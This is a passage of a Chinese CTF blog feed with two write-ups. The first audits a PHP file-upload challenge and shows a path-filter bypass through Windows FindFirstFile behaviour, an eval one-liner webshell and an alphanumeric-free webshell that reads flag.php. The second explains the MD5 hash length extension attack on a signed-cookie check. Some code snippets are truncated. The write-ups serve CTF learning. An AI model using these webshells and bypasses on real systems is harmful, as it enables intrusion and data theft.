$this-&gt;filename, $this-&gt;content);​      // just check if file is written. hopefully. //​      if(@file_get_contents($this-&gt;dir . $this-&gt;filename) == &quot;&quot;){​        return [&quot;msg&quot; =&gt; &quot;file not written.&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​      }​      return [&quot;type&quot; =&gt; &quot;success&quot;];​    }  }</code></pre><h2 id="4-过滤函数"><a href="#4-过滤函数" class="headerlink" title="4)过滤函数:"></a>4)过滤函数:</h2><pre><code> function rrmdir($dir, $depth=0){ ​    if (is_dir($dir)){​      $objects = scandir($dir); ​      foreach ($objects as $object){ ​        if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​          if(is_dir($dir.&quot;/&quot;.$object))​            rrmdir($dir.&quot;/&quot;.$object, $depth + 1);​          else​            unlink($dir.&quot;/&quot;.$object); ​        }​      }​    }​    if($depth != 0) rmdir($dir);   }  function countdir($dir){​    if (is_dir($dir)){​      $objects = scandir($dir);​      foreach ($objects as $object){ ​        if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​          $count += 1;​          if(is_dir($dir.&quot;/&quot;.$object))​            $count += countdir($dir.&quot;/&quot;.$object);​        }​      }​    }​    return $count;  }  var_dump(countdir(&quot;./files&quot;));  if(countdir(&quot;./files/&quot;) &gt;= 100) @rrmdir(&quot;./files/&quot;);  // Here, kawaii path-san for you! //  function path_sanitizer($dir, $harden=false){​    $dir = (string)$dir;​    $dir_len = strlen($dir);​    // Deny LFI/RFI/XSS //​    $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];​    foreach($filter as $f){​      if(stripos($dir, $f) !== false){​        return false;​      }​    }​    // Deny SSRF and all possible weird bypasses //​    $stream = stream_get_wrappers();​    $stream = array_merge($stream, stream_get_transports());​    $stream = array_merge($stream, stream_get_filters());​    foreach($stream as $f){​      $f_len = strlen($f);​      if(substr($dir, 0, $f_len) === $f){​        return false;​      }​    }​    // Deny length //​    if($dir_len &gt;= 128){​      return false;​    }​    // Easy level hardening //​    if($harden){​      $harden_filter = [&quot;/&quot;, &quot;\\&quot;];​      foreach($harden_filter as $f){​        $dir = str_replace($f, &quot;&quot;, $dir);​      }​    }​    // Sanitize feature is available starting from the medium level //​    return $dir;  }  // The new kakkoii code-san is re-implemented. //  function code_sanitizer($code){​    // Computer-chan, please don&#39;t speak english. Speak something else! //​    $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;*Nope*&quot;, (string)$code);​    return $code;  }</code></pre><h2 id="5-还有这段代码"><a href="#5-还有这段代码" class="headerlink" title="5)还有这段代码:"></a>5)还有这段代码:</h2><pre><code>@require(&#39;flag.php&#39;);$seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));if($flag === $_GET[&#39;trigger&#39;]){​    die(hash(&quot;sha256&quot;, $seed . $flag));  }class System {​    function __destruct(){​      global $seed;​      // ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?​      $flag = hash(&#39;sha256&#39;, $seed);​      if($_GET[$flag]){​        @system($_GET[$flag]);​      }else{​        @unserialize($_SESSION[$flag]);​      }​    }  }</code></pre><p>这里是迷惑点,拿不到flag</p><h1 id="2-分析put要过滤的点"><a href="#2-分析put要过滤的点" class="headerlink" title="2.分析put要过滤的点"></a>2.分析put要过滤的点</h1><p>首先这个条件成立才能put文件</p><p><code>if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;]))</code></p><p>文件名不能包含这些符号</p><pre><code>$filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];​    foreach($filter as $f){​      if(stripos($dir, $f) !== false){​        return false;​      }​    }</code></pre><p>长度限制:</p><pre><code>if($dir_len &gt;= 128){​      return false;​    }</code></pre><p>content的限制:</p><p><code>$code = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;*Nope*&quot;, (string)$code);</code></p><p><img src="/CTF/2/1.png" alt="1"></p><p>本地测试下:</p><pre><code>$a=@$_POST[a];//$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?]/u&quot;, &quot;h&quot;, $a);$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;h&quot;, $a);echo $a;</code></pre><p> <img src="/CTF/2/2.png" alt="1"></p><p><img src="/CTF/2/3.png" alt="1"></p><p>多了四个 hhhh  输入的字符没有被替换 怎么多了四个hhhh?</p><p>发现</p><p><img src="/CTF/2/4.png" alt="1"></p><p>应该是这样的,它会默认匹配 /r /n 属于一个字节,而汉字匹配的话是两个字节</p><p>所以这样的话就是四个字节了 替换后就变成了四个hhhh</p><p>再输入一个回车试下:</p><p><img src="/CTF/2/5.png" alt="1"></p><p><img src="/CTF/2/6.png" alt="1"></p><p>假如一句话是</p><?php eval(@$_REQUEST[a]);?><p> </p><p>虽然添加了几个字符 但并不影响php代码的执行</p><p>总结来说 就是让上传一个没有字母和数字的webshell</p><h1 id="3-分析get要过滤的点"><a href="#3-分析get要过滤的点" class="headerlink" title="3.分析get要过滤的点"></a>3.分析get要过滤的点</h1><p>1)这个函数解析url中get参数</p><p>explode(“&amp;”, $_SERVER[‘QUERY_STRING’]);</p><p><img src="/CTF/2/7.png" alt="1"></p><p>2)看过滤点:</p><pre><code>  $read_file = &quot;./files/&quot; . $this-&gt;filename;​        $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);​        if($read_file === $read_file_with_hardened_filter ||​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){​          return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​        }</code></pre><p>首先看这个函数</p><pre><code>path_sanitizer($this-&gt;filename, true) --&gt;if($harden){​      $harden_filter = [&quot;/&quot;, &quot;\\&quot;];​      foreach($harden_filter as $f){​        $dir = str_replace($f, &quot;&quot;, $dir);​      }​    }</code></pre><p>它将文件名中 /  \替换为空</p><p>然后这个if判断为真的话不能包含文件</p><pre><code> if($read_file === $read_file_with_hardened_filter ||​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter))</code></pre><p> 也就是说包含的文件名必须加 / 或 \  同时文件内容也是不一样的</p><p>比如上传一个test  然后包含文件时是test\  -&gt;  test不等于test\  并且 file_get_contents(‘test&#39;)不等于file_get_contents(‘test’)</p><p>那么这个判断就可以绕过了</p><p>现在测试一下</p><p><img src="/CTF/2/8.png" alt="1"></p><p>再包含下</p><p><img src="/CTF/2/9.png" alt="1"></p><p>可以发现  成功include  但是文件内容没有读取 </p><p><code>@include(&quot;./files/&quot; . $this-&gt;filename);  -&gt;  ./files/test\</code>  它包含的是这个文件</p><p>而我们上传的文件是这样的:  ./files/test</p><p>所以文件并不能读取</p><h1 id="4-windows-FindFirstFile利用"><a href="#4-windows-FindFirstFile利用" class="headerlink" title="4.windows  FindFirstFile利用"></a>4.windows  FindFirstFile利用</h1><pre><code>&lt;?phpfor ($j=0; $j&lt;256; $j++) {​        for ($i=0; $i&lt;256; $i++) {​                $url = &#39;flag.p&#39; . chr($j) . chr($i);​                $tmp = @file_get_contents($url);​                if (!empty($tmp)) echo chr($j) . chr($i) . &quot; &quot;;​        }}?&gt;</code></pre><p><img src="/CTF/2/10.png" alt="1"></p><p> <img src="/CTF/2/11.png" alt="1"></p><p><img src="/CTF/2/12.png" alt="1"></p><p>本地测试 </p><p><img src="/CTF/2/13.png" alt="1"></p><p>本题环境是 windows</p><p>所以我们可以上传 文件名为  “/test   绕过:</p><pre><code>$read_file = &quot;./files/&quot; . $this-&gt;filename;   // ./files/./test$read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);  // ./files/.test@file_get_contents($read_file)  //实际获取内容@file_get_contents($read_file_with_hardened_filter)  // 文件不存在</code></pre><p> <img src="/CTF/2/14.png" alt="1"></p><p> <img src="/CTF/2/15.png" alt="1"></p><p>5.最后就是构造无数字字母的webshell</p><?php readfile('flag.php');?><p>看P牛文章:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>在构造前先理解下自增运算符拿shell的原理</p><pre><code>&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Arraygt;</code></pre><p>再构造readfile(‘flag.php’)</p><pre><code>&lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quotgt;</code></pre><p>然后记得url编码过去 + 在匹配中会认为是空格</p><p><img src="/CTF/2/16.png" alt="1"></p><p>然后包含</p><p> <img src="/CTF/2/17.png" alt="1"></p><p>再补充下为什么文件后缀不是 php 可以执行 php代码  只要文件内容是php完整代码就能执行</p><p> <img src="/CTF/2/18.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-审计源码&quot;&gt;&lt;a href=&quot;#1-审计源码&quot; class=&quot;headerlink&quot; title=&quot;1.审计源码&quot;&gt;&lt;/a&gt;1.审计源码&lt;/h1&gt;&lt;p&gt;意思就是让上传个马,然后包含过去读flag&lt;/p&gt;
&lt;p&gt;要把一些无关紧要的代码略过&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>哈希长度扩展攻击</title>
    <link href="http://perthinking.xyz/CTF/1/"/>
    <id>http://perthinking.xyz/CTF/1/</id>
    <published>2020-04-19T10:45:11.000Z</published>
    <updated>2020-05-13T07:25:58.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻击的常见来源"><a href="#攻击的常见来源" class="headerlink" title="攻击的常见来源:"></a>攻击的常见来源:</h1><p>大多数网站有下载文件的选项,它会判断你是否具有权限下载这个文件,就会对你想要下载的任意文件名进行类似于MD5,Sha等算法的hash,例如你想要下载hash=test.pdf%00../../../etc/password<br>它就可能执行判断语句:<br>if ($sig === md5($salt.$name))<br>但是这样的话就有可能被绕过的风险</p><h1 id="MD5算法解析"><a href="#MD5算法解析" class="headerlink" title="MD5算法解析:"></a>MD5算法解析:</h1><p>Md5的典型应用是对一段字符串产生指纹,防止被篡改.就相当于每个人都有自己独立的指纹(在算法里面是可以绕过的)<br>MD5以多个512位(64个字节)分组来处理文本,每组16个32位(4个字节)子分组.算法输出由32位分组组成.当每一个块(512位分组)计算完成后,四个寄存器的值就被更新,如果还存在下一个块,就会在被更新的寄存器上继续计算,直到所有块被计算完毕,四个寄存器的十六进制值连接起来就是MD5<br>当被hash的字符串长度不足512bit时,就得部位</p><p>部位(补bit和补长度)<br>判断len(str) % 512 = 448 ,如果不是的话,就对它进行部位,例如test为四个字节,要让条件成立的话,就必须补(448-4*8)个bit,首先补一个二进制位上的一个1,接着在后面补0.然后补剩下的64bit的长度,<br>这个长度就是字符串的长度,如果超出64位,就取低64位<br>例如补完一个块可能是这样的:</p><p><code>Str + &#39;\x80&#39; + &#39;\x00&#39;*n + &#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</code></p><p>其中算法的补位这部分,就是实现长度扩展攻击的关键,所以部位肯定是可控的</p><h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理:"></a>攻击原理:</h1><p>构造部位:</p><p>假如有一个下载文件的题目,已知字符串 ‘secret+test.pdf’的hash值,secret的长度为10,要求你下载这个网站的其它文件</p><p>实现攻击的第一步,将secret+test.pdf补足到64字节</p><p><code>Len(secret) + len(&quot;test.pdf&quot;) + len(padding) + 8 = 64</code></p><p>可以计算出padding的长度为64-8-10-8=38</p><p>先补一个二进制位上的1即”\x80” 和37个0即”\x00”<em>37,于是变成了这样:</em></p><p><code>Secret + &quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + 8</code></p><p>再补后面的8个字节,这8个字节的内容是len(secret+test.pdf)即18(144位),换算成16进制就是\x90 + 7个二进制位上的0  所以变成:</p><p><code>Secret + &quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + &quot;\x90\x00\x00\x00\x00\x00\x00\x00&quot;</code></p><p>​    </p><h1 id="构造hash"><a href="#构造hash" class="headerlink" title="构造hash:"></a>构造hash:</h1><p>用工具爆破即可</p><p>所以:构造补位就是为了不用计算第一块的值,只需要计算第二块或者第二块以后的值,而初始值就是原来的hash(这个知道就行了),然后用构造的字符串计算出新的hash</p><p>题目主要源码:</p><pre><code>if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}</code></pre><p>绕过条件:<br><code>username=admin password!=admin  $COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</code><br>用脚本爆破是不可能的,因为我尝试过了<br>所以用到了hash长度扩展攻击,条件符合<br>直接上HashPump脚本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;攻击的常见来源&quot;&gt;&lt;a href=&quot;#攻击的常见来源&quot; class=&quot;headerlink&quot; title=&quot;攻击的常见来源:&quot;&gt;&lt;/a&gt;攻击的常见来源:&lt;/h1&gt;&lt;p&gt;大多数网站有下载文件的选项,它会判断你是否具有权限下载这个文件,就会对你想要下载的任意文件名进行
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
</feed>
